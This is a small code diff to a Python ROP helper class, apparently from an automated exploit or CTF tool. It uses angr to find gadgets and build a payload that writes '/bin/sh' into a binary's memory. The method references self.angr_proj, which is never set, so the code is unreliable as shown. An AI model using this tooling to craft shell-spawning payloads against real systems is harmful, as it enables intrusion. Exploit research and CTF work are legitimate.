@@ -15,21 +15,13 @@ class ROP:
         self.gadgets = []
         self.find_gadgets()
         self.libc = "/opt/libc.so.6"
-        # angrop stuff
-        #self.angr_proj = angr.Project(self.analysis.binary)
-        #self.angr_rop  = self.angr_proj.analyses.ROP()
-        ##self.angr_rop.find_gadgets_single_threaded() 
-        #self.angr_rop.find_gadgets()
-        #self.fart_print = Print()
 
     def write_binsh_to_mem(self):
-
         angr_proj = angr.Project(self.analysis.binary)
         angr_rop  = self.angr_proj.analyses.ROP()
         #angr_rop.find_gadgets_single_threaded() 
         angr_rop.find_gadgets()
         fart_print = Print()
-
         self.analysis.hbsh = True
         return angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
     
